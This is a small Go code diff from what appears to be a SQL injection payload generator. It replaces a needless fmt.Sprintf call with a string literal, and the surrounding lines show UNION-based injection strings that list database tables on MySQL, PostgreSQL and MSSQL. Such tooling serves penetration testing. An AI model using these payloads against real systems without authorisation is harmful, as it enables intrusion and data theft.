@@ -261,7 +261,7 @@ func (pg *PayloadGenerator) ListTables(dbname string) string {
 	case DBMSMySQL:
 		return fmt.Sprintf("' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='%s'--", dbname)
 	case DBMSPostgres:
-		return fmt.Sprintf("' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--")
+		return "' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--"
 	case DBMSMSSQL:
 		return fmt.Sprintf("' UNION SELECT name FROM %s..sysobjects WHERE xtype='U'--", dbname)
 	case DBMSOracle:
